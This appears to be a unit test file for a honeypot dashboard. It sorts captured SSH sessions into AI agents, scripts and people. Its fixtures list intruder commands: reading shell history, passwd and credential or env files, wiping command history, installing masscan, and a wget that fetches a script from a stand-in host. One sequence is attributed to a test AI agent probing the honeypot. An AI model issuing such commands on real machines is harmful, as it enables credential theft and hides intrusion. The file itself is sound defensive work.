"""dashboard/server.py: telling AI agents apart from people and scripts in SSH sessions."""
import os
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "dashboard"))
import server  # noqa: E402

T = 1_800_000_000_000
IP = "45.155.205.10"


def session(client, commands, gaps_s):
    """A Cowrie session: login, then one command after each gap (seconds)."""
    evs = [{"eventid": "cowrie.session.connect", "t": T, "src_ip": IP, "protocol": "ssh"},
           {"eventid": "cowrie.client.version", "t": T + 1, "version": client},
           {"eventid": "cowrie.login.success", "t": T + 1000, "username": "root", "password": "root"}]
    t = T + 1000
    for cmd, gap in zip(commands, gaps_s):
        t += int(gap * 1000)
        evs.append({"eventid": "cowrie.command.input", "t": t, "input": cmd})
    return server.make_cowrie("s1", evs)


class AgentScoring(unittest.TestCase):
    EXPLORE = ["id", "uname -a", "cat /etc/os-release", "ls -la /root", "df -h", "ps aux"]

    # what the test agent of tools/agent_eval.py typed: it opens things it has just seen in a listing
    AGENT = ["ls -la /etc", "ls -la /etc/credstore", "ls -la /root", "cat /root/.bash_history",
             "cat /root/RUNBOOK.md", "ls -la /etc/nb", "cat /etc/nb/monitor.env", "ps auxww"]

    def test_following_up_on_listings_at_a_steady_pace_is_an_agent(self):
        x = session("SSH-2.0-paramiko_3.4.0", self.AGENT, [3.9, 2.6, 2.9, 2.1, 2.4, 2.5, 2.0, 3.4])
        self.assertEqual(x["cls"], "agent_suspected")
        self.assertTrue(any("Followed up" in r for r in x["reasons"]))

    def test_script_with_random_sleeps_is_not_an_agent(self):
        # paced and varied, but nothing it asks for came from an earlier listing
        x = session("SSH-2.0-paramiko_3.4.0", self.EXPLORE + ["ls /var/www", "cat /root/.bash_history"],
                    [6.8, 8.7, 2.6, 10.9, 1.7, 2.6, 15.4, 8.5])
        self.assertEqual(x["cls"], "unknown")
        self.assertTrue(any("never followed up" in r for r in x["reasons"]))

    def test_script_with_a_fixed_sleep_is_a_script(self):
        x = session("SSH-2.0-paramiko_3.4.0", self.EXPLORE + ["w", "free -m"],
                    [7.7, 5.4, 5.41, 5.39, 5.4, 5.42, 5.4, 5.4])
        self.assertEqual(x["cls"], "script")
        self.assertTrue(any("Clockwork" in r for r in x["reasons"]))

    def test_follow_ups_ignore_stock_names_and_urls(self):
        self.assertEqual(server.follow_ups(["ls -la /root", "cat /root/.bash_history", "ls /root/.ssh",
                                            "wget http://198.51.100.7/root/x.sh"]), [])
        self.assertEqual(server.follow_ups(["cat /opt/app/config.yml", "ls /opt/app"]), [])   # asked before looking
        self.assertEqual(server.follow_ups(["cd /opt/app && ls", "cat /opt/app/config.yml"]), ["/opt/app/config.yml"])

    def test_pasting_into_putty_is_a_person(self):
        cmds = ["\x1b[200~unset HISTFILE; export HISTSIZE=0", "w", "uname -a", "cat /proc/cpuinfo",
                "[200~apt install make[201~", "y"]
        x = session("SSH-2.0-PuTTY_Release_0.85", cmds, [12, 2, 3, 6, 16, 4])
        self.assertEqual(x["cls"], "human_like")
        self.assertTrue(any("PuTTY" in r for r in x["reasons"]))

    def test_paste_markers_alone_are_a_person(self):
        cmds = ["\x1b[200~id\x1b[201~", "uname -a", "ls /root", "cat /etc/passwd"]
        x = session("SSH-2.0-OpenSSH_9.6", cmds, [6, 6, 6.5, 6])
        self.assertEqual(x["cls"], "human_like")

    def test_waiting_for_installs_is_not_thinking(self):
        cmds = ["cat /proc/mounts", "apt update", "apt-get install libpcap-dev -y", "apt-get install libpcap-dev -y",
                "apt-get install masscan -y", "history -c && history -w"]
        x = session("SSH-2.0-Renci.SshNet.SshClient.0.0.1", cmds, [1.7, 4.1, 28, 25, 25, 16])
        self.assertNotEqual(x["cls"], "agent_suspected")
        self.assertTrue(any("slow commands" in r for r in x["reasons"]))


if __name__ == "__main__":
    unittest.main()
